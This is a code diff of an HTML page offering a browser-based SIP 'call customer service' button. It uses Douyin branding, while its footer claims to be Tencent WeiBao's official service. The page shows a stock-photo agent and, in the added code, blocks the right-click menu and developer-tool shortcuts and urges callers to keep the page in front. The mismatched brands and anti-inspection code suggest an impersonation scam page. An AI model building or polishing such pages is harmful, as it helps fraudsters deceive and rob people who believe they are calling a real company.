@@ -3,113 +3,123 @@
 <head>
   <meta charset="utf-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>抖音客服在线通话</title>
+  <title>抖音在线客服</title>
   <style>
     :root {
-      --dy-black: #000;
       --dy-pink: #fe2c55;
       --dy-blue: #25f4ee;
-      --dy-bg: #121212;
-      --dy-light-gray: #f3f3f3;
+      --dy-bg-dark: #0d0d0d;
+      --dy-text-light: #ffffff;
       --dy-border-radius: 16px;
-      --dy-font: 'PingFang SC', 'Microsoft YaHei', Arial, sans-serif;
     }
     body {
+      font-family: "PingFang SC", "Microsoft YaHei", sans-serif;
+      background-color: var(--dy-bg-dark);
+      color: var(--dy-text-light);
       margin: 0;
       padding: 0;
-      background-color: var(--dy-bg);
-      font-family: var(--dy-font);
-      color: white;
       display: flex;
       flex-direction: column;
       align-items: center;
-      justify-content: flex-start;
-      min-height: 100vh;
     }
     .logo-box {
       margin-top: 36px;
-      margin-bottom: 24px;
+      margin-bottom: 20px;
     }
     .logo-box img {
       height: 60px;
     }
     .main-content {
-      background: #1f1f1f;
-      padding: 32px 24px;
+      background-color: #1a1a1a;
       border-radius: var(--dy-border-radius);
-      box-shadow: 0 0 24px rgba(255, 255, 255, 0.05);
+      box-shadow: 0 0 12px rgba(255, 255, 255, 0.05);
+      padding: 32px 24px;
       text-align: center;
-      width: 90vw;
-      max-width: 400px;
+      max-width: 92vw;
     }
     .profile-avatar {
-      width: 72px;
-      height: 72px;
+      width: 68px;
+      height: 68px;
       border-radius: 50%;
-      margin-bottom: 20px;
-      border: 3px solid var(--dy-blue);
+      object-fit: cover;
+      border: 2px solid var(--dy-blue);
+      margin-bottom: 16px;
     }
     h1 {
       font-size: 26px;
-      margin-bottom: 20px;
-      color: var(--dy-blue);
-    }
-    #callButton, #hangupButton {
-      width: 100%;
-      padding: 14px;
-      font-size: 18px;
-      border: none;
-      border-radius: 30px;
-      margin: 10px 0;
-      cursor: pointer;
+      margin: 8px 0 24px 0;
       font-weight: bold;
-      transition: background 0.2s ease;
+    }
+    button {
+      font-size: 18px;
+      padding: 14px 36px;
+      margin: 10px;
+      border: none;
+      border-radius: 28px;
+      font-weight: 600;
+      cursor: pointer;
+      transition: all 0.2s ease;
     }
     #callButton {
-      background: linear-gradient(90deg, var(--dy-pink), #ff5b77);
+      background: linear-gradient(90deg, var(--dy-pink), var(--dy-blue));
       color: white;
     }
     #callButton:disabled {
-      background: #ff8da5;
+      background: #555;
       cursor: not-allowed;
     }
     #hangupButton {
-      background: linear-gradient(90deg, #555, #222);
+      background: linear-gradient(90deg, #999, #444);
       color: white;
     }
     #hangupButton:disabled {
-      background: #888;
+      background: #333;
       cursor: not-allowed;
     }
     #callStatus {
-      margin-top: 12px;
+      margin-top: 18px;
       font-size: 16px;
-      color: #ccc;
+      color: #aaa;
     }
     .footer {
-      font-size: 14px;
       color: #999;
-      margin: 40px 20px;
+      font-size: 14px;
       text-align: center;
+      margin: 30px 16px 40px;
+      line-height: 1.8;
+    }
+    .footer strong {
+      color: var(--dy-blue);
+    }
+    @media (max-width: 500px) {
+      button {
+        width: 88vw;
+        margin: 8px 0;
+      }
     }
   </style>
 </head>
 <body>
+
   <div class="logo-box">
-    <img src="https://lf3-static.bytednsdoc.com/obj/eden-cn/lpqodtrgujjljpvj/douyin-logo.svg" alt="抖音 LOGO" />
+    <img src="https://img.alicdn.com/imgextra/i4/O1CN01dnivBF1N5RSFx2Jfa_!!6000000001533-2-tps-200-200.png" alt="抖音LOGO" />
   </div>
+
   <div class="main-content">
-    <h1>抖音客服中心</h1>
+    <h1>抖音在线客服</h1>
     <img class="profile-avatar" src="https://randomuser.me/api/portraits/women/44.jpg" alt="客服头像" />
     <button id="callButton" onclick="makeCall()">📞 呼叫客服</button>
     <button id="hangupButton" onclick="hangupCall()" disabled>🛑 挂断</button>
     <div id="callStatus">未呼叫</div>
     <audio id="audioRemote" autoplay></audio>
   </div>
+
   <div class="footer">
-    客服通话过程中请勿关闭页面或切换后台，以免中断对话。<br />
-    服务时间：每日 9:00 - 21:00<br />
-    © 2025 抖音客服 版权所有
+    <strong>温馨提示：</strong><br>
+    您正在使用腾讯微保官方在线客服。点击“呼叫客服”按钮即可与专业客服通话。<br>
+    如需帮助，请随时点击“挂断”结束当前通话。微保将竭诚为您服务。<br>
+    客服服务时间：9:00-21:00（节假日无休）<br>
+    <span style="color:#666;font-size:13px;display:block;margin-top:8px;">© 2025 腾讯微保 版权所有</span>
   </div>
 
   <script src="https://webrtc.github.io/adapter/adapter-latest.js"></script>
@@ -126,6 +136,7 @@
         session_timers: false,
         register: true
       };
+
       const ua = new JsSIP.UA(configuration);
       let session = null;
       let isCalling = false;
@@ -133,6 +144,7 @@
       ua.start();
       ua.on('registered', () => console.log('✅ 注册成功'));
       ua.on('registrationFailed', e => console.error('❌ 注册失败', e));
+      ua.on('disconnected', () => console.warn('SIP WebSocket 断开'));
 
       const callButton = document.getElementById('callButton');
       const hangupButton = document.getElementById('hangupButton');
@@ -141,6 +153,24 @@
 
       function updateStatus(text) {
         statusDisplay.textContent = text;
+      }
+
+      // ✅ 页面不可见提醒
+      document.addEventListener('visibilitychange', function () {
+        if (document.hidden) {
+          alert("为保证通话顺畅，请保持页面激活在前台。");
+        }
+      });
+
+      // ✅ 通话提醒振动
+      function vibrateNotify() {
+        if (navigator.vibrate) navigator.vibrate([300, 200, 300]);
+      }
+
+      // ✅ 通话提示音
+      function playBeep() {
+        const audio = new Audio('https://cdn.pixabay.com/audio/2022/03/15/audio_1f7d60e2d1.mp3');
+        audio.play().catch(() => {});
       }
 
       window.makeCall = function () {
@@ -158,20 +188,23 @@
           }
         });
 
+        vibrateNotify();
+        playBeep();
+
         session.connection.addEventListener('addstream', function (e) {
           remoteAudio.srcObject = e.stream;
           remoteAudio.play().catch(err => console.warn('播放失败:', err));
         });
 
-        session.on('progress', () => updateStatus("正在接通中..."));
+        session.on('progress', () => updateStatus("等待接通中..."));
         session.on('accepted', () => updateStatus("通话中"));
         session.on('ended', () => {
-          updateStatus("通话结束");
+          updateStatus("通话已结束");
           resetUI();
         });
         session.on('failed', (e) => {
-          updateStatus("呼叫失败，请重试");
-          console.error('呼叫失败:', e);
+          updateStatus("通话失败，请重试");
+          console.error('失败:', e);
           resetUI();
         });
       };
@@ -186,6 +219,18 @@
         hangupButton.disabled = true;
         session = null;
       }
+
+      // ✅ 禁止右键菜单
+      document.addEventListener('contextmenu', event => event.preventDefault());
+      // ✅ 禁止 F12、Ctrl+Shift+I 等调试
+      document.onkeydown = function (e) {
+        if (
+          e.key === 'F12' ||
+          (e.ctrlKey && e.shiftKey && ['I', 'J', 'C'].includes(e.key.toUpperCase()))
+        ) {
+          return false;
+        }
+      };
     });
   </script>
 </body>
